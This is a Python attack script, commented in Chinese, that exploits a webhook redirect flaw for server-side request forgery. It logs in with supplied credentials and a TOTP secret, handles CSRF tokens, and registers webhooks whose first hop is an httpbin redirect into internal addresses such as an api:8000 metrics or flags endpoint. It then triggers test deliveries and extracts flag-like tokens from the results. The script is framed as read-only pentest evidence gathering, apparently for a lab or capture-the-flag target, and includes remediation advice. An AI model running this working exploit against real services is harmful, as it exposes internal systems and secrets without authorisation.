#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""webhook_probe.py —— Webhook 首跳校验绕过的 SSRF 取证。

场景：新增回调只校验“提交时的 URL”（HTTPS/公网），投递时跟随 302 不再校验。
用法：
  python webhook_probe.py --base https://host --email merchant@x --password ... \
      --totp-secret BASE32 --inner http://api:8000/metrics --inner http://api:8000/internal/flags

默认用 https://httpbin.org/redirect-to?url= 作为合法首跳；也可以 --redirector 换。
只做 GET 投递和只读内部端点；不发破坏性请求。
"""
import argparse
import html
import json
import os
import re
import sys
import time
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit
from findings import FindingStore


def csrf_of(text):
    m = re.search(r'name=["\']_csrf["\']\s+value=["\']([^"\']+)["\']', text or "")
    return m.group(1) if m else None


def delivery_rows(text):
    rows = []
    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", text or "", re.S):
        t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", row)).strip()
        if t:
            rows.append(t)
    return rows


def main():
    p = argparse.ArgumentParser(description="Webhook redirect SSRF probe")
    p.add_argument("--base", required=True)
    p.add_argument("--login-url", default="/login")
    p.add_argument("--email", default=None)
    p.add_argument("--password", default=None)
    p.add_argument("--totp-secret", default=None)
    p.add_argument("--cookie", default=None)
    p.add_argument("--cookie-jar", default=None)
    p.add_argument("--page", default="/supplier/webhooks")
    p.add_argument("--redirector", default="https://httpbin.org/redirect-to?url=")
    p.add_argument("--inner", action="append", default=[],
                   help="内网/内部 URL，可重复；如 http://api:8000/metrics")
    p.add_argument("--events", default="order.created")
    p.add_argument("--endpoint-id", type=int, default=None,
                   help="复用已存在的回调端点（配额满时用）")
    p.add_argument("--flag-regex", default=r"\b[A-Z][A-Z0-9_]{2,19}\{[ -~]{4,120}\}",
                   help="从投递结果里提取 flag/令牌的模式")
    p.add_argument("--wait", type=float, default=3)
    p.add_argument("--rps", type=float, default=1.0)
    p.add_argument("--timeout", type=float, default=45)
    p.add_argument("--out", default="webhook-findings.json")
    p.add_argument("--evidence-dir", default="webhook-raw")
    args = p.parse_args()
    if not args.inner:
        args.inner = ["http://api:8000/metrics"]
    c = httpkit.HttpClient(base_url=args.base, cookie=args.cookie,
                           cookie_jar=args.cookie_jar, rps=args.rps,
                           timeout=args.timeout, evidence_dir=args.evidence_dir)
    if args.email and not args.cookie_jar and not args.cookie:
        c.login(args.login_url, {"email": args.email, "password": args.password},
                csrf_url=args.login_url, totp_secret=args.totp_secret)
    store = FindingStore(args.out)

    page = c.get(args.page, tag="webhook-page")
    if "登录工作台" in (page["text"] or ""):
        print("login_required"); return
    csrf = csrf_of(page["text"])
    if not csrf:
        print("no csrf"); return

    for inner in args.inner:
        url = args.redirector + urllib.parse.quote(inner, safe="")
        if args.endpoint_id:
            rid = args.endpoint_id
            print("reuse endpoint", rid, "->", inner)
        else:
            r = c.post(args.page, data={"_csrf": csrf, "url": url, "events": args.events},
                       headers={"Referer": args.base + args.page}, tag="webhook-create")
            after = c.get(args.page, tag="webhook-after-create")
            ids = [int(i) for i in re.findall(r"/webhooks/(\d+)/test", after["text"])]
            rid = max(ids) if ids else None
            print("create", inner, "->", r["status"], "id", rid)
            if not rid:
                print("  create rejected (max endpoints?); retry with --endpoint-id N")
                continue
        page2 = c.get(args.page, tag="webhook-before-test")
        csrf2 = csrf_of(page2["text"])
        if not csrf2:
            print("  no csrf before test"); continue
        c.post("%s/%d/test" % (args.page, rid), data={"_csrf": csrf2},
               headers={"Referer": args.base + args.page}, tag="webhook-test-%d" % rid)
        time.sleep(args.wait)
        final = c.get(args.page, tag="webhook-after-test")
        rows = delivery_rows(final["text"])
        hit = [x for x in rows if inner in x or args.redirector in x]
        delivery = hit[-1][:800] if hit else ""
        flags = re.findall(args.flag_regex, html.unescape(final["text"]))
        codes = re.findall(r"\b[1-5]\d{2}\b", delivery)
        followed = bool(re.search(r"\b30[1278]\b.{0,60}?\b20[0-4]\b", delivery, re.S))
        severity = "high" if (flags or followed) else "info"
        confidence = "confirmed" if flags else ("confirmed-redirect" if followed else "needs-review")
        print("  delivery:", delivery or "(no row)", "| codes", codes)
        store.add(module="webhook", title="Webhook 重定向 SSRF 测试", severity=severity,
                  endpoint=args.base + args.page, method="POST", confidence=confidence,
                  evidence={"redirector": args.redirector, "inner": inner, "endpoint_id": rid,
                            "delivery": delivery, "codes": codes, "flags": flags},
                  impact=("首跳 HTTPS 合法、投递跟随 302 进入内网并返回内容，SSRF 成立。"
                          if (flags or followed) else
                          "未见跟随跳转或内网响应；换 redirector/内部端口再试。"),
                  remediation="每一跳都做 URL/私网校验；出站白名单；禁止跟随到私网地址。",
                  tags=["ssrf", "webhook"])
    store.save()
    print(json.dumps(store.summary(), ensure_ascii=False))
    print("findings:", os.path.abspath(args.out))


if __name__ == "__main__":
    main()
